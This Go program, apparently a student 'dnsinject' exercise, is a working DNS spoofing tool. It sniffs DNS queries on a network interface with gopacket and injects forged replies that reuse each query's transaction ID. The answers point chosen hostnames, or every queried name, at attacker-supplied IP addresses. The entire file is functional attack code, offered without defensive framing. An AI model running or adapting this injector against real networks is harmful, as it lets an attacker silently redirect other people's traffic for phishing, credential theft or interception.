package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"

	gopacket "github.com/google/gopacket"
	layers "github.com/google/gopacket/layers"
	pcap "github.com/google/gopacket/pcap"
)

//Execute function for open live
func Execute_Live(interfaceI string, hostfile string, bpf string) {

	//if -f is provided
	if hostfile != "None" {
		//map code
		var urlhost = ""
		var tokenip = ""
		var iparr = [4]int{1, 1, 1, 1}
		var hostmap = make(map[string][4]int)
		dat, _ := ioutil.ReadFile(hostfile)
		str := strings.NewReader(string(dat))
		scanner := bufio.NewScanner(str)
		for scanner.Scan() {
			r := bufio.NewReader(strings.NewReader(scanner.Text()))
			for {
				token, err := r.ReadSlice(' ')
				if err == io.EOF {
					break
				}
				tokenip = strings.Replace(string(token), " ", "", -1)
				//ip
				n := ""
				ind := 0
				for i := 0; i < len(tokenip); i++ {
					if tokenip[i] != '.' {
						n = n + string(tokenip[i])
					} else {
						iparr[ind], _ = strconv.Atoi(n)
						n = ""
						ind++
					}
					if i+1 == len(tokenip) {
						iparr[ind], _ = strconv.Atoi(n)
						n = ""
						ind++
					}
				}

				b, _ := r.ReadSlice('\n')
				urlhost = strings.Replace(string(b), " ", "", -1)
				urlhost = strings.Replace(urlhost, "*", ".*", -1)
				if urlhost != "" && tokenip != "" {
					hostmap[urlhost] = iparr
					tokenip = ""
					urlhost = ""
				}

			}
		}
		//map code
		var protocol = ""
		var dstPort = ""

		//for ubuntu give proper interface name here such as eth0
		if handle, err := pcap.OpenLive(interfaceI, 1600, true, pcap.BlockForever); err != nil {
			fmt.Println("The provided interface is not present. Please check")
			os.Exit(1)
		} else {
			//bpf logic
			if bpf != "none" {
				//fmt.Println("BPF "+bpf)
				if err := handle.SetBPFFilter(bpf); err != nil {
					fmt.Println("Invalid BPF filter")
					os.Exit(1)
				}
			}

			packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
			for packet := range packetSource.Packets() {

				//resetting loop vars
				protocol = ""

				//tcp and udp layer data
				//checking if layer is present
				re := regexp.MustCompile("[0-9]+")
				if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
					udp, _ := udpLayer.(*layers.UDP)
					protocol = "UDP"
					//srcPort = re.FindString((udp.SrcPort).String())
					dstPort = re.FindString((udp.DstPort).String())
				}

				//validation to get needed packets
				if (dstPort == "53") && protocol == "UDP" {

					if dnslayer := packet.Layer(layers.LayerTypeDNS); dnslayer != nil {
						dns_l, _ := dnslayer.(*layers.DNS)
						if dns_l.QDCount == 1 {
							s := dns_l.Questions[0]
							//validate by iterating map and inject
							for h, i := range hostmap {
								matched, _ := regexp.Match(h, []byte(s.Name))
								if matched {
									//fmt.Printf("to be sniffed: %q\n", h)
									//have to inject a packet as the hostname matched
									//create udp packet
									eth := layers.Ethernet{
										SrcMAC:       net.HardwareAddr{0x0, 0x19, 0xe3, 0xd3, 0x53, 0x52},
										DstMAC:       packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC,
										EthernetType: layers.EthernetTypeIPv4,
									}
									ip := layers.IPv4{
										Version:  4,
										TTL:      64,
										Protocol: layers.IPProtocolUDP,
										SrcIP:    packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP,
										DstIP:    packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP,
									}
									udp := layers.UDP{
										SrcPort: 53,
										DstPort: packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort,
									}
									dns := layers.DNS{
										ID:           dns_l.ID,
										QR:           true,
										OpCode:       dns_l.OpCode,
										AA:           dns_l.AA,
										TC:           dns_l.TC,
										RD:           dns_l.RD,
										RA:           true,
										Z:            dns_l.Z,
										ResponseCode: dns_l.ResponseCode,
										QDCount:      dns_l.QDCount,
										ANCount:      dns_l.ANCount,
										NSCount:      dns_l.NSCount,
										ARCount:      dns_l.ARCount,
										Questions:    dns_l.Questions,
										Answers: []layers.DNSResourceRecord{
											{
												Name:       dns_l.Questions[0].Name,
												Type:       dns_l.Questions[0].Type,
												Class:      dns_l.Questions[0].Class,
												DataLength: 4,
												Data:       []byte{byte(i[0]), byte(i[1]), byte(i[2]), byte(i[3])},
												IP:         net.IPv4(byte(i[0]), byte(i[1]), byte(i[2]), byte(i[3])),
											},
										},
									}
									udp.SetNetworkLayerForChecksum(&ip)
									payload := []byte{}
									options := gopacket.SerializeOptions{
										ComputeChecksums: true,
										FixLengths:       true,
									}
									buff := gopacket.NewSerializeBuffer()
									if e := gopacket.SerializeLayers(buff, options, &eth, &ip, &udp, &dns, gopacket.Payload(payload)); e != nil {
										fmt.Println("error occured while creating packet" + e.Error())
									}
									finalPacket := buff.Bytes()
									if err := handle.WritePacketData(finalPacket); err != nil {
										fmt.Println("error occured while sending packet" + err.Error())
									}
									//fmt.Println(i)
									fmt.Println((packet.Metadata().Timestamp).String() + " IP " + (packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP).String() + "." + (packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort).String() +
										" --> " + (packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP).String() + "." + (packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort).String() + ": " + strconv.Itoa(int(dns_l.ID)) + " " +
										string(dns_l.Questions[0].Name))

									break

								}
								// if strings.Contains(token, string(s.Name)) {
								// 	fmt.Printf("to be sniffed: %q\n", token)
								// }

							}
						}
					}
				}

			}

		}

	} else {
		//get ip addr

		var localAddr net.IP
		addrs, _ := net.InterfaceAddrs()
		for _, address := range addrs {
			if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					localAddr = ipnet.IP
				}
			}
		}
		var tokenip = (localAddr).String()
		//fmt.Println(tokenip)
		var iparr = [4]int{0, 0, 0, 0}
		n := ""
		ind := 0
		for i := 0; i < len(tokenip); i++ {
			if tokenip[i] != '.' {
				n = n + string(tokenip[i])
			} else {
				iparr[ind], _ = strconv.Atoi(n)
				n = ""
				ind++
			}
			if i+1 == len(tokenip) {
				iparr[ind], _ = strconv.Atoi(n)
				n = ""
				ind++
			}
		}
		//fmt.Println(iparr)

		//inject for every packet seen on interface
		var protocol = ""
		var dstPort = ""

		//for ubuntu give proper interface name here such as eth0
		if handle, err := pcap.OpenLive(interfaceI, 1600, true, pcap.BlockForever); err != nil {
			fmt.Println("The provided interface is not present. Please check")
			os.Exit(1)
		} else {
			//bpf logic
			if bpf != "none" {
				//fmt.Println("BPF "+bpf)
				if err := handle.SetBPFFilter(bpf); err != nil {
					fmt.Println("Invalid BPF filter")
					os.Exit(1)
				}
			}

			packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
			for packet := range packetSource.Packets() {

				//resetting loop vars
				protocol = ""

				//tcp and udp layer data
				//checking if layer is present
				re := regexp.MustCompile("[0-9]+")
				if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
					udp, _ := udpLayer.(*layers.UDP)
					protocol = "UDP"
					//srcPort = re.FindString((udp.SrcPort).String())
					dstPort = re.FindString((udp.DstPort).String())
				}

				//validation to get needed packets
				if (dstPort == "53") && protocol == "UDP" {

					if dnslayer := packet.Layer(layers.LayerTypeDNS); dnslayer != nil {
						dns_l, _ := dnslayer.(*layers.DNS)
						if dns_l.QDCount == 1 {
							//s := dns_l.Questions[0]
							//inject
							//have to inject a packet as the hostname matched
							//create udp packet
							eth := layers.Ethernet{
								SrcMAC:       net.HardwareAddr{0x0, 0x19, 0xe3, 0xd3, 0x53, 0x52},
								DstMAC:       packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC,
								EthernetType: layers.EthernetTypeIPv4,
							}
							ip := layers.IPv4{
								Version:  4,
								TTL:      64,
								Protocol: layers.IPProtocolUDP,
								SrcIP:    packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP,
								DstIP:    packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP,
							}
							udp := layers.UDP{
								SrcPort: 53,
								DstPort: packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort,
							}
							dns := layers.DNS{
								ID:           dns_l.ID,
								QR:           true,
								OpCode:       dns_l.OpCode,
								AA:           dns_l.AA,
								TC:           dns_l.TC,
								RD:           dns_l.RD,
								RA:           true,
								Z:            dns_l.Z,
								ResponseCode: dns_l.ResponseCode,
								QDCount:      dns_l.QDCount,
								ANCount:      dns_l.ANCount,
								NSCount:      dns_l.NSCount,
								ARCount:      dns_l.ARCount,
								Questions:    dns_l.Questions,
								Answers: []layers.DNSResourceRecord{
									{
										Name:       dns_l.Questions[0].Name,
										Type:       dns_l.Questions[0].Type,
										Class:      dns_l.Questions[0].Class,
										DataLength: 4,
										Data:       []byte{byte(iparr[0]), byte(iparr[1]), byte(iparr[2]), byte(iparr[3])},
										IP:         net.IPv4(byte(iparr[0]), byte(iparr[1]), byte(iparr[2]), byte(iparr[3])),
									},
								},
							}
							udp.SetNetworkLayerForChecksum(&ip)
							payload := []byte{}
							options := gopacket.SerializeOptions{
								ComputeChecksums: true,
								FixLengths:       true,
							}
							buff := gopacket.NewSerializeBuffer()
							if e := gopacket.SerializeLayers(buff, options, &eth, &ip, &udp, &dns, gopacket.Payload(payload)); e != nil {
								fmt.Println("error occured while creating packet" + e.Error())
							}
							finalPacket := buff.Bytes()
							if err := handle.WritePacketData(finalPacket); err != nil {
								fmt.Println("error occured while sending packet" + err.Error())
							}
							//fmt.Println(i)
							fmt.Println((packet.Metadata().Timestamp).String() + " IP " + (packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP).String() + "." + (packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort).String() +
								" --> " + (packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP).String() + "." + (packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort).String() + ": " + strconv.Itoa(int(dns_l.ID)) + " " +
								string(dns_l.Questions[0].Name))

						}

					}
				}
			}
		}

	}

}

//main function
func main() {
	//fmt.Println("Initialised mydump.go file..")
	//get arguments from command line
	//capture -i -r -s
	var interfaceI string
	var hostnamesI string
	var bpf string
	// flags declaration using flag package
	flag.StringVar(&interfaceI, "i", "None", "Specify interface. Default is eth0")
	flag.StringVar(&hostnamesI, "f", "None", "Provide the path to hosts file")
	flag.Parse()

	//getting bpf filter statement
	//if even number of args are present then the bpf filter is givesn if odd number of args are present then not
	if len(os.Args)%2 == 0 {
		bpf = os.Args[len(os.Args)-1]
	} else {
		bpf = "None"
	}

	//fmt.Println("BPF filter" + bpf)
	var defdev = ""

	//fmt.Println("This is live capture")
	if interfaceI == "None" {
		//getting the interface
		device_list, err := pcap.FindAllDevs()
		if err != nil {
			panic(err)
			os.Exit(1)
		}
		for _, device := range device_list {
			//fmt.Println(device)
			defdev = device.Name
			break
		}
	} else {
		defdev = interfaceI
	}

	//fmt.Println(defdev)
	Execute_Live(defdev, hostnamesI, strings.ToLower(bpf))

}
